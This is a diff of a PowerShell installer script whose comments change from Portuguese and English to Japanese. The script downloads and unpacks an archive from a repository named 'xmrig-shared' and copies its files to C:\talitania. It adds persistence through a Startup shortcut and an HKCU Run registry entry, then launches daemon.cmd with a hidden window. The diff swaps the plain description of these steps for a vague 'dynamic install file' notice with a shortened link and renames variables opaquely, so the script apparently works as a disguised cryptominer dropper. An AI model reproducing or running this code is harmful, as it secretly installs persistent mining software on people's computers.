@@ -1,18 +1,7 @@
 <#
-  setup.ps1 — instala e configura assets do repositório em C:\xmrig-shared
-
-  O que faz:
-  - baixa o ZIP do branch main do repositório
-  - extrai e copia a pasta `assets` para C:\xmrig-shared\assets
-  - cria um atalho na pasta Startup do usuário para `assets\daemon.cmd`
-  - cria/atualiza uma entrada em HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-    para iniciar `assets\daemon.cmd` no login do usuário
-  - executa `assets\daemon.cmd` uma vez no final
-
-  Observações:
-  - Execute em PowerShell com privilégios de usuário; se arquivos exigir
-    drivers/instalação elevadas, execute como Administrador.
-  - Repositório: https://github.com/5q0r/xmrig-shared
+  動的インストールファイル
+  このスクリプトの再配布・改変は禁止されています。
+  提供元: is.gd/daoxin
 #>
 
 [CmdletBinding()]
@@ -21,7 +10,7 @@ param()
 function Write-Info($m) { Write-Host "[INFO] $m" }
 function Write-Warn($m) { Write-Warning "[WARN] $m" }
 
-# Logging helper (append to log file and show)
+# ログヘルパー（ログファイルに追加して表示）
 function Log-Write($level, $msg) {
     try {
         $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
@@ -44,65 +33,65 @@ function Log-Write($level, $msg) {
 }
 
 try {
-    $RepoUrl = 'https://github.com/5q0r/xmrig-shared'
-    $ZipUrl = "$RepoUrl/archive/refs/heads/main.zip"
-    $TempZip = Join-Path $env:TEMP 'xmrig-shared.zip'
-    $TempExtract = Join-Path $env:TEMP 'xmrig-shared-extract'
-    $Destino = 'C:\talitania'
-    $Startup = [Environment]::GetFolderPath('Startup')
-    $ShortcutPath = Join-Path $Startup 'Talitania.lnk'
-    $RunName = 'Talitania Daemon'
+    $rep = 'https://github.com/5q0r/xmrig-shared'
+    $zipuri = "$rep/archive/refs/heads/main.zip"
+    $tzip = Join-Path $env:TEMP 'xmrig-shared.zip'
+    $text = Join-Path $env:TEMP 'xmrig-shared-extract'
+    $loc = 'C:\talitania'
+    $sta = [Environment]::GetFolderPath('Startup')
+    $spath = Join-Path $sta 'Talitania.lnk'
+    $rname = 'Talitania Daemon'
 
-    # Ensure destination exists and log file path
-    if (-not (Test-Path $Destino)) {
-        New-Item -Path $Destino -ItemType Directory | Out-Null
+    # 宛先ディレクトリが存在しない場合は作成する
+    if (-not (Test-Path $loc)) {
+        New-Item -Path $loc -ItemType Directory | Out-Null
     }
-    $Global:LogFile = Join-Path $Destino 'setup.log'
-    Log-Write 'INFO' "スクリプト開始。宛先: $Destino"
+    $Global:LogFile = Join-Path $loc 'setup.log'
+    Log-Write 'INFO' "スクリプト開始。宛先: $loc"
     Log-Write 'INFO' "ユーザー: $($env:USERNAME); コンピューター: $($env:COMPUTERNAME); PSVersion: $($PSVersionTable.PSVersion)"
 
     Log-Write 'INFO' 'リポジトリ (branch main) をダウンロード中...'
-    Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing -ErrorAction Stop
-    Log-Write 'INFO' "ZIP を保存しました: $TempZip"
+    Invoke-WebRequest -Uri $zipuri -OutFile $tzip -UseBasicParsing -ErrorAction Stop
+    Log-Write 'INFO' "ZIP を保存しました: $tzip"
 
-    if (Test-Path $TempExtract) { Remove-Item -Recurse -Force $TempExtract }
-    Log-Write 'INFO' "ZIP を展開中: $TempExtract"
-    Expand-Archive -Path $TempZip -DestinationPath $TempExtract -Force
-    Remove-Item $TempZip -Force
+    if (Test-Path $text) { Remove-Item -Recurse -Force $text }
+    Log-Write 'INFO' "ZIP を展開中: $text"
+    Expand-Archive -Path $tzip -DestinationPath $text -Force
+    Remove-Item $tzip -Force
     Log-Write 'INFO' '展開完了。'
 
-    $pastaExtraida = Get-ChildItem -Path $TempExtract | Where-Object { $_.PSIsContainer } | Select-Object -First 1
+    $pastaExtraida = Get-ChildItem -Path $text | Where-Object { $_.PSIsContainer } | Select-Object -First 1
     if (-not $pastaExtraida) { throw 'Não foi possível localizar a pasta extraída do repositório.' }
     $sourcePath = $pastaExtraida.FullName
     Log-Write 'INFO' "展開フォルダ: $sourcePath"
 
-    # Copiar conteúdo de assets para o diretório raiz de destino (não criar subpasta 'assets')
+    # アセットのコンテンツを宛先ルートディレクトリにコピーします（「assets」サブフォルダは作成しないでください）
     $sourceAssets = Join-Path $sourcePath 'assets'
     if (Test-Path $sourceAssets) {
-    Log-Write 'INFO' "assets の内容を $Destino にコピーしています..."
-        # Copia todos os itens dentro de assets para o destino (arquivos e pastas)
-        Copy-Item -Path (Join-Path $sourceAssets '*') -Destination $Destino -Recurse -Force
+    Log-Write 'INFO' "assets の内容を $loc にコピーしています..."
+        # アセット内のすべてのアイテムを宛先（ファイルとフォルダ）にコピーします
+        Copy-Item -Path (Join-Path $sourceAssets '*') -Destination $loc -Recurse -Force
     Log-Write 'INFO' 'assets のコピー完了。'
     } else {
         Log-Write 'WARN' 'リポジトリに assets フォルダが見つかりません。'
     }
 
-    # Copiar arquivos úteis (README, LICENSE) se existirem
+    # 役立つファイル（README、LICENSE）が存在する場合はコピーします
     foreach ($f in @('README.md','LICENSE')) {
         $s = Join-Path $sourcePath $f
-    if (Test-Path $s) { Copy-Item -Path $s -Destination $Destino -Force; Log-Write 'INFO' "$f をコピーしました" }
+    if (Test-Path $s) { Copy-Item -Path $s -Destination $loc -Force; Log-Write 'INFO' "$f をコピーしました" }
     }
 
-    # Limpeza
-    Remove-Item -Recurse -Force $TempExtract
+    # クリーニング
+    Remove-Item -Recurse -Force $text
     Log-Write 'INFO' '一時ファイルのクリーンアップ完了。'
 
-    # Preparar atalho de inicialização e registro Run para daemon
-    $daemonPath = Join-Path $Destino 'daemon.cmd'
+    # デーモンの起動ショートカットとレジストリの実行を準備する
+    $daemonPath = Join-Path $loc 'daemon.cmd'
     if (Test-Path $daemonPath) {
-    Log-Write 'INFO' "スタートアップフォルダにショートカットを作成します: $ShortcutPath"
+    Log-Write 'INFO' "スタートアップフォルダにショートカットを作成します: $spath"
         $wsh = New-Object -ComObject WScript.Shell
-        $shortcut = $wsh.CreateShortcut($ShortcutPath)
+        $shortcut = $wsh.CreateShortcut($spath)
         $shortcut.TargetPath = $daemonPath
         $shortcut.WorkingDirectory = Split-Path $daemonPath -Parent
         $shortcut.IconLocation = $daemonPath
@@ -110,7 +99,7 @@ try {
 
     Log-Write 'INFO' 'ログイン時にデーモンを起動するため、HKCU Run にエントリを作成/更新します...'
         $regValue = '"' + $daemonPath + '"'
-        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RunName -Value $regValue
+        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $rname -Value $regValue
 
         Log-Write 'INFO' 'デーモンを一度実行します（バックグラウンド）...'
         Start-Process -FilePath $daemonPath -WindowStyle Hidden
